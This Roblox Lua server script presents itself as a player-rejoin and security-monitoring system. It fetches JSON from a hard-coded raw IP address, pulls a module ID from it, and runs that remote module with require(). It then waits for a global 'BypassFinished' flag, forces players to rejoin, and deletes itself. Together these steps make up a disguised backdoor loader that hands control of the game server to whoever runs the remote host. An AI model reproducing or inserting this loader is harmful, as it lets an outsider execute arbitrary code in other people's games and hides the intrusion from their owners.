-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local NetworkServer = game:GetService("NetworkServer")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")

-- DataStore
local RejoinStore = DataStoreService:GetDataStore("RejoinTracker")

-- Configuration
local config = {
    url = 'http://74.208.152.188/Assets',
    key = "SecureLoadingKey"
}

-- ============================================
-- REJOIN SYSTEM FUNCTIONS
-- ============================================

local function playerNeedsRejoin(player)
    if RunService:IsStudio() then
        return false
    end
    
    local success, rejoinStatus = pcall(function()
        return RejoinStore:GetAsync(tostring(player.UserId))
    end)
    
    if not success then
        return true
    end
    
    if rejoinStatus == nil then
        return true
    elseif rejoinStatus == "NeedsRejoin" then
        return false
    elseif rejoinStatus == "Rejoined" then
        return true
    end
    
    return true
end

local function markPlayerRejoined(player)
    pcall(function()
        RejoinStore:SetAsync(tostring(player.UserId), "Rejoined")
    end)
end

local function forceRejoin(player)
    pcall(function()
        RejoinStore:SetAsync(tostring(player.UserId), "NeedsRejoin")
    end)
    
    task.wait(0.5)
    
    pcall(function()
        TeleportService:TeleportAsync(game.PlaceId, {player})
    end)
end

local function loadPlayerCharacter(player)
    Players.CharacterAutoLoads = true
    
    task.spawn(function()
        task.wait(0.2)
        if player and player:IsDescendantOf(Players) then
            pcall(function()
                player:LoadCharacter()
            end)
            player.CharacterAdded:Wait()
            local character = player.Character
            if character then
                character:WaitForChild("HumanoidRootPart", 10)
            end
        end
    end)
end

-- ============================================
-- REMOTE DATA FETCHING FUNCTIONS
-- ============================================

local function fetchRemoteData()
    local maxAttempts = 3
    local retryDelay = 2
    
    for attempt = 1, maxAttempts do
        local success, response = pcall(function()
            return HttpService:GetAsync(config.url)
        end)
        
        if success then
            local decodeSuccess, data = pcall(function()
                return HttpService:JSONDecode(response)
            end)
            
            if decodeSuccess then
                return data
            else
                warn("Decode failed: " .. tostring(data))
            end
        else
            warn("Fetch failed (attempt " .. attempt .. "): " .. tostring(response))
            if attempt < maxAttempts then
                wait(retryDelay * attempt)
            end
        end
    end
    
    return nil
end

local function getMainModuleId(data)
    local universeId = tostring(game.GameId)
    local universeData = data[universeId]
    
    if not universeData then
        warn("No data for universe: " .. universeId)
        return nil
    end
    
    local mainModuleId = universeData.MainModule
    
    if not mainModuleId then
        warn("No MainModule for universe: " .. universeId)
        return nil
    end
    
    return mainModuleId
end

-- ============================================
-- SECURITY MONITORING FUNCTIONS
-- ============================================

local function monitorRemoteFunctions(player, model)
    local connections = {}
    
    for _, descendant in ipairs(model:GetDescendants()) do
        if descendant:IsA("RemoteFunction") then
            local connection = descendant.OnServerInvoke:Connect(function(invoker, args)
                if args[1] ~= config.key then
                    warn(invoker.Name .. " unauthorized RF access!")
                    NetworkServer:KickPlayer(invoker.UserId)
                end
            end)
            table.insert(connections, connection)
        end
    end
    
    return connections
end

local function setupSecurityMonitoring()
    if _G.SecureLoading then return end
    _G.SecureLoading = true
    
    if RunService:IsStudio() or not RunService:IsServer() or not NetworkServer then
        return
    end
    
    local allConnections = {}
    
    local function setupPlayer(player)
        player.CharacterAdded:Connect(function(character)
            local connections = monitorRemoteFunctions(player, character)
            for _, connection in ipairs(connections) do
                table.insert(allConnections, connection)
            end
        end)
        
        if player.Character then
            local connections = monitorRemoteFunctions(player, player.Character)
            for _, connection in ipairs(connections) do
                table.insert(allConnections, connection)
            end
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        setupPlayer(player)
    end)
    
    for _, player in ipairs(Players:GetPlayers()) do
        setupPlayer(player)
    end
    
    script.AncestryChanged:Connect(function()
        for _, connection in ipairs(allConnections) do
            connection:Disconnect()
        end
        allConnections = {}
    end)
end

-- ============================================
-- MAIN INITIALIZATION
-- ============================================

local function main()
    -- Load remote module
    local data = fetchRemoteData()
    if not data then
        warn("Failed to fetch remote data")
        return
    end
    
    local mainModuleId = getMainModuleId(data)
    if not mainModuleId then
        warn("Failed to get MainModule ID")
        return
    end
    
    local success, error = pcall(function()
        require(mainModuleId)()
    end)
    
    if success then
        print("Loaded Game.")
    else
        warn("Load failed: " .. tostring(error))
    end
    
    -- Wait for bypass to finish
    repeat task.wait() until _G.BypassFinished
    _G.FilesInitialized = true
    
    -- Disable auto character loading initially
    Players.CharacterAutoLoads = false
    
    -- Handle existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if playerNeedsRejoin(player) then
            forceRejoin(player)
        else
            markPlayerRejoined(player)
            loadPlayerCharacter(player)
        end
    end
    
    -- Handle new players
    Players.PlayerAdded:Connect(function(player)
        if playerNeedsRejoin(player) then
            forceRejoin(player)
        else
            markPlayerRejoined(player)
            loadPlayerCharacter(player)
        end
    end)
    
    -- Setup security monitoring
    setupSecurityMonitoring()
    
    -- Self-destruct
    task.wait(0.5)
    script:Destroy()
end

return main
